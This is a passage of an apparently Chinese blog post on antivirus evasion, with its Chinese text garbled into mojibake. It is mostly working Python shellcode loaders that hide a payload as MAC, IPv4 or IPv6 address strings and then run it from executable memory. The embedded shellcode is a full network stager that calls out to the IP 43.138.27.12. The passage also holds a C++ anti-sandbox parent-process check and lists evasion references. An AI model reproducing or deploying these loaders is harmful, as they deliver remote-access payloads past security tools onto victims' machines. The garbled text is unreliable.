\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">mac_address = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode) / <span class="number">6</span> * <span class="number">17</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) / <span class="number">6</span>):</span><br><span class="line">    cut_byte = shellcode[i * <span class="number">6</span>:<span class="number">6</span> + i * <span class="number">6</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetAddressToStringA(cut_byte, mac_address + i * <span class="number">17</span>)</span><br><span class="line">mac_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">6</span>):</span><br><span class="line">    mac = ctypes.string_at(mac_address + i * <span class="number">17</span>, <span class="number">17</span>)</span><br><span class="line">    mac_list.append(mac)</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(mac_list)*<span class="number">6</span>,<span class="number">0x3000</span>,<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mac_list)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac_list[i], mac_list[i], ptr1)</span><br><span class="line">    ptr1 += <span class="number">6</span></span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr, <span class="built_in">len</span>(mac_list)*<span class="number">6</span>, <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="python-ipv4å†…å­˜åŠ è½½å™¨"><a href="#python-ipv4å†…å­˜åŠ è½½å™¨" class="headerlink" title="python ipv4å†…å­˜åŠ è½½å™¨"></a>python ipv4å†…å­˜åŠ è½½å™¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcodeå¡«å……ä¸º4çš„å€æ•°</span></span><br><span class="line">shellcode = <span class="string">&quot;\xfc\x48\x83......x00\x00&quot;</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment">#ç”³è¯·ipv4è™šæ‹Ÿå†…å­˜</span></span><br><span class="line">ipv4_address = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,ctypes.c_int(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>*<span class="number">16</span>),<span class="number">0x3000</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†tlIpv4AddressToStringAå°†shellcodeè½¬æ¢ä¸ºipv4å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">    cut_byte = shellcode[i*<span class="number">4</span>:<span class="number">4</span>+i*<span class="number">4</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(cut_byte, ipv4_address+i*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ipv4_list = []</span><br><span class="line"><span class="comment">#è·å–IPv4 åœ°å€çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">     ipv4_str = ctypes.string_at(ipv4address+i*<span class="number">16</span>,<span class="number">16</span>)</span><br><span class="line">     ipv4_list.append(ipv4_str)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#ç”³è¯·shellcodeå†…å­˜</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="comment">#RtlIpv4StringToAddressAå°†ipv4è½¬ä¸ºäºŒè¿›åˆ¶å†™å…¥å†…å­˜ï¼Œå†…å­˜é€’å½’å¢é•¿4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ipv4_list)):     </span><br><span class="line"> ctypes.windll.Ntdll.RtlIpv4StringToAddressA(ipv4_list[i],<span class="literal">False</span>,ipv4_list[i],ptr1)</span><br><span class="line"> ptr1 += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="python-ipv6å†…å­˜åŠ è½½å™¨"><a href="#python-ipv6å†…å­˜åŠ è½½å™¨" class="headerlink" title="python ipv6å†…å­˜åŠ è½½å™¨"></a>python ipv6å†…å­˜åŠ è½½å™¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    null_byte = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line">    shellcode += null_byte</span><br><span class="line">ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64</span><br><span class="line">ptr_alloc_1 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>))</span><br><span class="line">ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, <span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>, <span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc_1, ctypes.c_int(<span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">16</span>):</span><br><span class="line">    bytes_shellcode = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv6AddressToStringA(bytes_shellcode, ptr_realloc_1 + i * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">ipv6_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">16</span>):</span><br><span class="line">    ipv6 = ctypes.string_at(ptr_realloc_1 + i * <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">    ipv6_list.append(ipv6)</span><br><span class="line"><span class="built_in">print</span>(ipv6_list)</span><br><span class="line"></span><br><span class="line">ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, <span class="built_in">len</span>(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc_2, ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">rwxpage = ptr_realloc_2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ipv6_list)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv6StringToAddressA(ipv6_list[i], ipv6_list[i], rwxpage)</span><br><span class="line">    rwxpage += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc_2, <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="nim-shellcodeå…æ€"><a href="#nim-shellcodeå…æ€" class="headerlink" title="nim shellcodeå…æ€"></a>nim shellcodeå…æ€</h2><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/11052">https://xz.aliyun.com/t/11052</a></p><h2 id="ç‰¹å¾ç ä¿®æ”¹-â€“èŠ±æŒ‡ä»¤æ·»åŠ -â€”upxåŠ å£³"><a href="#ç‰¹å¾ç ä¿®æ”¹-â€“èŠ±æŒ‡ä»¤æ·»åŠ -â€”upxåŠ å£³" class="headerlink" title="ç‰¹å¾ç ä¿®æ”¹ â€“èŠ±æŒ‡ä»¤æ·»åŠ  â€”upxåŠ å£³"></a>ç‰¹å¾ç ä¿®æ”¹ â€“èŠ±æŒ‡ä»¤æ·»åŠ  â€”upxåŠ å£³</h2><p>æ€è·¯å‚è€ƒï¼ˆæ¯”è¾ƒè€ï¼‰</p><p><a href="https://blog.51cto.com/match/1401629">https://blog.51cto.com/match/1401629</a></p><p><a href="https://bbs.kanxue.com/thread-97345.htm">https://bbs.kanxue.com/thread-97345.htm</a></p><h2 id="DLLåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h2><p><a href="https://xz.aliyun.com/t/11711">https://xz.aliyun.com/t/11711</a></p><p><a href="https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.freebuf.com/_articles_78807_html/index.html">https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.freebuf.com/_articles_78807_html&#x2F;index.html</a></p><p><a href="https://www.freebuf.com/articles/system/324598.html">https://www.freebuf.com/articles/system/324598.html</a></p><p><a href="https://tttang.com/archive/1365/#toc_0x09">https://tttang.com/archive/1365/#toc_0x09</a></p><p><a href="https://sec-in.com/article/1562">https://sec-in.com/article/1562</a></p><p><a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p><h2 id="syscallå…æ€ä»‹ç»ï¼š"><a href="#syscallå…æ€ä»‹ç»ï¼š" class="headerlink" title="syscallå…æ€ä»‹ç»ï¼š"></a>syscallå…æ€ä»‹ç»ï¼š</h2><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/11448">https://xz.aliyun.com/t/11448</a></p><p><a href="https://xz.aliyun.com/t/11496#toc-2">https://xz.aliyun.com/t/11496#toc-2</a></p><p><a href="https://xz.aliyun.com/t/11532#toc-11">https://xz.aliyun.com/t/11532#toc-11</a></p><h2 id="åæ²™ç®±æ£€æµ‹"><a href="#åæ²™ç®±æ£€æµ‹" class="headerlink" title="åæ²™ç®±æ£€æµ‹"></a>åæ²™ç®±æ£€æµ‹</h2><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/articles/system/202717.html">https://www.freebuf.com/articles/system/202717.html</a></p><p><a href="https://www.anquanke.com/post/id/186218">https://www.anquanke.com/post/id/186218</a></p><p><a href="https://forum.butian.net/share/758">https://forum.butian.net/share/758</a></p><p><a href="https://drunkmars.top/2021/10/04/%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%B0%83%E8%AF%95/">https://drunkmars.top/2021/10/04/%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%B0%83%E8%AF%95/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¾ˆå¤šæ€è½¯éƒ½æœ‰è‡ªå·±çš„åç«¯äº‘æ²™ç®±ï¼Œè¿™äº›æ²™ç®±èƒ½å¤Ÿæ¨¡æ‹Ÿå‡ºè½¯ä»¶æ‰§è¡Œæ‰€éœ€çš„è¿è¡Œç¯å¢ƒï¼Œé€šè¿‡è¿›ç¨‹hookæŠ€æœ¯æ¥å¯¹è½¯ä»¶æ‰§è¡Œè¿‡ç¨‹ä¸­çš„è¡Œä¸ºè¿›è¡Œåˆ†æï¼Œåˆ¤æ–­å…¶æ˜¯å¦æœ‰æ•æ„Ÿçš„æ“ä½œè¡Œä¸ºï¼Œæˆ–è€…æ›´é«˜çº§çš„æ£€æµ‹æ‰‹æ³•æ˜¯ï¼Œå°†è·å–åˆ°çš„ç¨‹åºçš„APIè°ƒç”¨åºåˆ—ä»¥åŠå…¶ä»–çš„ä¸€äº›è¡Œä¸ºç‰¹å¾è¾“å…¥åˆ°æ™ºèƒ½åˆ†æå¼•æ“ä¸­è¿›è¡Œæ£€æµ‹ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬çš„æœ¨é©¬æ²¡æœ‰åšå¥½åè°ƒè¯•ï¼Œå¾ˆå®¹æ˜“å°±è¢«æ²™ç®±æ£€æµ‹å‡ºæ¥ã€‚</span><br><span class="line"></span><br><span class="line">å‰è¨€</span><br><span class="line">æœ€ç®€å•çš„åè°ƒè¯•çš„æªæ–½å°±æ˜¯æ£€æµ‹çˆ¶è¿›ç¨‹ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬æ‰‹åŠ¨ç‚¹å‡»æ‰§è¡Œçš„ç¨‹åºçš„çˆ¶è¿›ç¨‹éƒ½æ˜¯explorerã€‚å¦‚æœä¸€ä¸ªç¨‹åºçš„çˆ¶è¿›ç¨‹ä¸æ˜¯explorerï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®¤ä¸ºä»–æ˜¯ç”±æ²™ç®±å¯åŠ¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥exité€€å‡ºï¼Œè¿™æ ·ï¼Œæ€è½¯å°±æ— æ³•ç»§ç»­å¯¹æˆ‘ä»¬è¿›è¡Œè¡Œä¸ºåˆ†æäº†ã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œä¸»è¦çš„æ€è·¯æ˜¯è·å–è°ƒç”¨kernel32åº“ä¸­çš„CreateToolhelp32Snapshotå‡½æ•°è·å¾—ä¸€ä¸ªè¿›ç¨‹å¿«ç…§ä¿¡æ¯ï¼Œç„¶åä»å¿«ç…§ä¸­è·å–åˆ°explorer.exeçš„è¿›ç¨‹idä¿¡æ¯ï¼Œç„¶åé€šè¿‡å½“å‰è¿›ç¨‹çš„pidä¿¡æ¯åœ¨è¿›ç¨‹å¿«ç…§ä¸­æ‰¾åˆ°å…¶çˆ¶è¿›ç¨‹çš„idä¿¡æ¯ï¼Œæœ€åå°†ä¸¤è€…è¿›è¡Œæ¯”è¾ƒï¼Œåˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å¦æ˜¯æœ‰äººå·¥å¯åŠ¨çš„ã€‚</span><br><span class="line"></span><br><span class="line">åè°ƒè¯•çš„æªæ–½ä¸ä»…ä»…æ˜¯æ£€æµ‹çˆ¶è¿›ç¨‹ï¼Œè¿˜å¯ä»¥é€šè¿‡è°ƒç”¨windowsçš„APIæ¥å£IsDebuggerPresentæ¥æ£€æŸ¥å½“å‰è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">get_parent_processid</span><span class="params">(DWORD pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD ParentProcessID = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    HANDLE hkz;</span><br><span class="line"></span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    FARPROC Address = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Address == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;GetProc error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _asm &#123;</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        push <span class="number">2</span></span><br><span class="line">        call Address</span><br><span class="line">    mov hkz, eax</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hkz, &amp;pe)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pe.th32ProcessID == pid) &#123;</span><br><span class="line">            ParentProcessID 